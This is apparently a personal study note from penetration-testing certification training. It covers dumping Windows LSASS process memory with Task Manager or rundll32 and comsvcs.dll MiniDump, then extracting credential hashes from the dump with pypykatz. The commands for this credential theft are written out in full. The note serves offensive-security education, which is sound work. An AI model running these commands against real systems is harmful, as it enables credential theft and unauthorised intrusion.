Attacking LSASS
###############


Date: 2024-11-22 08:51

Status:

Tags: 

:ref:`Certified Penetration Tester <Certified Penetration Tester>`
:ref:`Password Attacks <Password Attacks>`


Description
**********************

Upon logging in the LSASS will: 1. Created credentials in memory 2.
Create access tokens 3. Enforce Security Policies 4. Write to the
Windows security log.

Dumping LSASS Process memory
**********************************

Task manage method
=====================

In the GUI task manager, find the Local Security Authority Process and
right click then select create dump file. A file is created in
c:\Users\<username>\AppData\Local\Temp\lass.DMP

Rundll32.exe and Comsvc.dll Method
===================================

Without a GUI we can use a CLI utility called rundll32.exe. This may be
detected with anti-virus.

Example 1: Find the lsass PID in cmd

.. code:: powershell

   C:\Windows\system32> tasklist /svc

Example 2: Find the PID in powershell

.. code:: powershell

   PS C:\Windows\system32> Get-Process lsass

Example 3: Creating the dump file with rundll32.exe

.. code:: powershell

   PS C:\Windows\system32> rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\Temp\lsass.dmp full

Using Pypykatz to get creds from the LSASS File
================================================

Once the LSASS memory has been dumped to a file, send it back to the
attack host.

Example 1: Using pypykatz to get hashes

.. code:: bash

   pypykatz lsa minidump lsass.dmp

Hashes can now be cracked using :ref:`hashcat <hashcat>`

References
****************
https://academy.hackthebox.com/module/147/section/1359
